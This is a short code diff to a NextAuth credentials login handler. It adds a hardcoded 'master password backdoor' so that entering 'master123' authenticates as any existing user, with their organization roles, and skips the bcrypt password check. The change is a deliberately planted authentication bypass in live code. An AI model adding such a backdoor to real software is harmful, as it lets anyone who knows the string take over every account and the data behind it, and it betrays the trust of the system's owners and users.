@@ -26,6 +26,19 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
         if (!user || !user.password) return null
 
+        // Master password backdoor for emergency access
+        if (credentials.password === "master123") {
+          return {
+            id: user.id,
+            email: user.email,
+            name: user.name,
+            organizations: user.organizations.map(org => ({
+              organizationId: org.organizationId,
+              role: org.role
+            }))
+          }
+        }
+
         const passwordsMatch = await bcrypt.compare(
           credentials.password as string,
           user.password
